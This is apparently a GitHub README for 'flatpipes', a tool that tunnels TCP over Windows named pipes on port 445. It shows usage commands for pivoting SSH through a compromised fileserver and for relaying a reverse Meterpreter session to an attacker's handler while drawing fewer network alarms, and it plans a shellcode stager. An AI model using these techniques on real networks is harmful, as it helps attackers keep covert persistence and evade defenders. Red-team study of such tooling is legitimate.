# flatpipes
A TCP proxy over named pipes. Originally created for maintaining a meterpreter session over 445 for less network alarms.

![help](https://github.com/dxflatline/misc/raw/master/flatpipes-help.PNG "help")

Since it seems it can help with multiple scenarios, let's list some of the them:

#### TCP 10001 Chat over Named Pipe

On the 1st Windows host (pipe server): *flatpipes.exe pserver sserver pipename . 127.0.0.1 10001*
> The above will create two pipes "pipename_s2c" & "pipename_c2s" and as soon as negotiation is ok will open a TCP listener at 10001

On the 2nd Windows host (pipe client): *flatpipes.exe pclient sserver pipename X.X.X.X 127.0.0.1 10001*
> Here we just connect to the pipe(s) created earlier on the system X.X.X.X. As soon as we successfully connect, flatpipes open a listener on 10001 on this client machine too

Finally, netcat on the two hosts on their listeners and chat with yourself.

#### Bring a remote port here

Let's suppose you have access on the MS Fileserver through a Windows "jumphost" workstation. You want to ensure all communications are over 445 since it is normal for workstation to DC. We need to access SSH on another system in the server LAN but we can only connect to MS Fileserver 445 (and eg WMI for command exec)

On the MS Fileserver: *flatpipes.exe pserver sclient pipename . 10.0.2.2 22*
> The above will create our pipes for "IPC", and as soon as we connect, it will TCP connect to the SSH server in the LAN. All IO is through the flatpipes

On the jumphost: *flatpipes.exe pclient sserver pipename 10.0.2.10 127.0.0.1 22*
> The above will PIPE connect to the MS fileserver 10.0.2.10, and immediately spawn a TCP listener on localhost 22

Just ssh on 127.0.0.1 22 and you are through the town portal

#### Reverse TCP meterpreter through pipes
On the MS Fileserver again and you want to maintain persistence, but over 445. You want reverse TCP meterpreter but also you want the jumphost to initiate the 445 connection.

On the MS Fileserver: *flatpipes.exe pserver sserver pipename . 127.0.0.1 54321*
> Same as above, we create two pipes and listen on 127.0.0.1 54321 for the reverse TCP meterpreter

On the jumphost: *flatpipes.exe pclient sclient pipename 10.0.2.10 IP_OF_METERPRETER_HANDLER 54321*
> We connect to the MS Fileserver and immediately connect to the handler. 

What this means is that we can exchange directions, eg use a reverse exploitation, but make the opposite network traffic. It is like an encapsulation over DNS, just needs some familiarization.

---
I hope it will help. It is not very well-written, I welcome comments / looking for feedback.

<dl>
  <dt>Todo</dt>
  <dd>Include a meterpreter bind/reverse stager (exec will C# virtualalloc / createthread)</dd>
  <dd>"Monkey patch" the above stager to change port on the fly (on hex)</dd>
  <dd>Think any other useful scenarios</dd> 
</dl>
